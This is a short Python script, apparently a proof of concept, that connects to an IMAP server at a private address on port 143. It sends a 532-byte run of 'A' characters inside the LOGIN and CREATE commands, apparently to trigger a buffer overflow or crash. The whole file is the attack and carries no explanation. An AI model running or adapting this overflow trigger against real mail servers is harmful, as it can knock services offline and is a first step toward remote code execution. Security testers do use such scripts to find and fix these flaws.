#!/usr/bin/python
 
import socket
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
buffer = '\x41' * 532
 
s.connect(('192.168.100.177',143))
s.recv(1024)
s.send('A001 LOGIN test@proteklab.com   test ' + buffer + '\r\n')
s.recv(1024)
s.send('A001 CREATE ' + buffer + '\r\n')
s.recv(1024)
s.close()
